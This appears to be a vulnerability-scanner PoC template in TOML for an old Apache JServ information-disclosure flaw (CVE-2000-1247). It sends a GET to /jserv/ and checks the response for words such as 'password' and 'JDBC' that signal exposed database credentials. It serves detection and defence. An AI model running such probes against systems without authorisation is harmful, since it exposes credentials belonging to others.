[info]
author = "AVE"
description = "Apache JServ 1.1.2 jserv-status 处理器默认配置仅允许本地访问，本地用户可通过 GET 请求 http://127.0.0.1/jserv/ 获取 JDBC 密码等敏感配置信息"
id = "POC-AVE-2000-1171"
name = "CVE-2000-1247 Apache JServ jserv-status 信息泄露 PoC"
severity = "low"
tags = ["ave-2000-1171"]
vuln_id = [
    "CVE-2000-1247",
    "AVE-2000-1171",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/jserv/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "password",
    "jdbc:",
    "jserv-status",
    "JDBC",
]
